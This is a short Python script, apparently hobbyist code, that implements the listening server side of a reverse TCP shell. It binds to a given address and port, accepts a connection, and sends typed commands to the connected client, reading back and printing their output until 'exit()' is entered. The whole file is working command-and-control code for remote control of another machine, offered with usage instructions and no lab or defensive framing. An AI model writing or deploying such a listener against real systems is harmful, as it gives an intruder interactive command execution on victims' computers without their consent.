#backup reverse.py

#server side of the reverse tcp shell
#not multi threading, so several commands won't work
#executing instruction : "c:\python script.py 127.0.0.1 65432"
import socket
import sys
import subprocess as sp
import click

#click module that help to accept arguments from the user
@click.command()
@click.argument('ip', nargs=2 , type=(str,int))
#@click.option('--helpme','-h ', help="c:\python script.py 127.0.0.1 65432")

def main(ip ):
	
	""" 
	reverse tcp tool , this is the server side that listens for incoming connections and able to send commands to the client
	"""
	host=ip[0]
	port=ip[1]
	s=coon(host, port)
	s.listen(100)
	conn,adrr = s.accept()
	print ("receiveing connection from %s:%s" %(adrr[0],adrr[1]))

	while 1:
		command = input("#> ")
		if command != "exit()":
			if command == "":
				continue
			command=command.encode()
			conn.send(command)
			result = conn.recv(1024)
			result=result.decode()
# i must check the size of a date since tcp is received in chunks so one recv might be not enough, i check the size		
			size=int(result[:16])
			message=result[16:]
			print("size of buffer is %d" %(size))
			testnum=len(message)
			print("size of message is %d" %(testnum))
			while size > len(message):
				print("i am here")
				result = conn.recv(1024)
				result=result.decode()
				message+=result
			message=message.replace("\\r\\n","")
			print (message)
		else:
			conn.send(b"exit()")
			print ("the shell is going down..")
			break
	s.close()


def coon(hosts, ports):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
		s.bind((hosts, ports))
		return s
	except socket.error as er:
		print("erron in socket           "+str(er))


		

if __name__ == "__main__":
    main()		
		
		 
		
			
